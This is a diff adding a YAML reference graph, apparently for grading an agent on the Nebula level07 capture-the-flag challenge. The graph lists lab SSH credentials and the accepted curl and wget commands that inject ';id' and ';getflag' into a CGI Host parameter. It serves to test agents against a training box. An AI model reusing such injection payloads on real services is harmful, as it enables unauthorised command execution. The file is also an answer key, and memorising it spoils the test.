@@ -1,0 +1,82 @@
+version: '0.5'
+graph:
+  type: reference
+challenge:
+  id: nebula_level07
+  name: Nebula Level 07
+  description: Exploit command injection in the web service on port 7007 to execute getflag as flag07.
+attacker_context:
+  user: level07
+  access:
+    method: ssh
+    credentials:
+      username: level07
+      password: level07
+  target:
+    host: <target-hostname-or-ip>
+    port: 22
+goal:
+  node: node2
+irrelevant_commands:
+- man
+- pwd
+- id
+- whoami
+- clear
+- history
+- uname
+- hostname
+- ls
+- cd
+- cat
+- file
+- strings
+- ltrace
+- strace
+nodes:
+- id: start
+  type: sentinel
+  label: Start
+- id: node0
+  type: state
+  label: Service identified
+- id: node1
+  type: state
+  label: Host parameter injection confirmed
+- id: node2
+  type: state
+  label: Execution as flag07 obtained
+edges:
+- id: edge0
+  from: start
+  to: node0
+  action: identify_web_service_on_7007
+  accepted_commands:
+  - netstat -lntp 2>/dev/null | grep 7007
+  - ss -lntp | grep 7007
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge1
+  from: node0
+  to: node1
+  action: trigger_command_injection_in_host_parameter
+  accepted_commands:
+  - wget "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bid" -O /tmp/out
+  - curl "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bid"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
+- id: edge2
+  from: node1
+  to: node2
+  action: execute_getflag_via_injected_host_parameter
+  accepted_commands:
+  - wget "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bgetflag" -O -
+  - curl "http://127.0.0.1:7007/index.cgi?Host=127.0.0.1%3Bgetflag"
+  transition_match:
+    exit_code: 0
+    stdout_regex: .*
+    stderr_regex: ^$
